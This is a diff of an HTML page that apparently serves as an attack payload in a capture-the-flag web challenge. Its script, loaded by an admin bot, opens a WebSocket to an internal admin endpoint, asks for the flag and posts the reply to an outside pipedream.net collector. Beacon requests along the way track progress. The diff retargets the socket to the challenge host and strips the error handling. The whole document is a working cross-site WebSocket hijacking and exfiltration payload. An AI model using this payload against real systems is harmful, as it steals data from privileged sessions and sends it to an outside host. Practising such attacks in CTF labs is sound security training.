@@ -6,60 +6,48 @@
 </head>
 <body>
     <script>
-        // Confirming bot access by logging interaction with the RequestBin
+        // Logging interaction with RequestBin to confirm bot access
         fetch('https://eohjvz10k1h17dr.m.pipedream.net/', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ message: "Bot accessed HTML page" })
-        }).catch(error => console.error("Error logging access:", error));
+        });
 
-        // WebSocket connection to retrieve the flag
-        const ws = new WebSocket('ws://web:8080/admin/ws');
-
+        // WebSocket connection to retrieve flag
+        const ws = new WebSocket('ws://ce441-web.spchallenge.ir:8080/admin/ws');
+        
+        fetch('https://eohjvz10k1h17dr.m.pipedream.net/', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ message: "After creating WS" })
+        });
+        
         ws.onopen = () => {
-            // Log successful connection
-            fetch('https://eohjvz10k1h17dr.m.pipedream.net/', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ message: "WebSocket connection opened successfully" })
-            }).catch(error => console.error("Error logging WebSocket open:", error));
-
-            // Request the flag
-            ws.send('flag');
+            ws.send('flag');  // Request the flag
         };
+
+        fetch('https://eohjvz10k1h17dr.m.pipedream.net/', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ message: "After sending flag re" })
+        });
 
         ws.onmessage = (event) => {
             const flag = event.data;
             console.log("Flag:", flag);
 
-            // Send the retrieved flag back to RequestBin
+            // Send the flag back to RequestBin
             fetch('https://eohjvz10k1h17dr.m.pipedream.net/', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ flag: flag })
-            }).catch(error => console.error("Error sending flag:", error));
+            });
 
             ws.close();
         };
 
         ws.onerror = (error) => {
             console.error("WebSocket error:", error);
-
-            // Send error details to RequestBin
-            fetch('https://eohjvz10k1h17dr.m.pipedream.net/', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ error: error.message || 'Unknown WebSocket error' })
-            }).catch(fetchError => console.error("Error sending WebSocket error:", fetchError));
-        };
-
-        ws.onclose = (event) => {
-            // Log WebSocket closure
-            fetch('https://eohjvz10k1h17dr.m.pipedream.net/', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ message: "WebSocket connection closed", code: event.code, reason: event.reason })
-            }).catch(error => console.error("Error logging WebSocket closure:", error));
         };
     </script>
 </body>
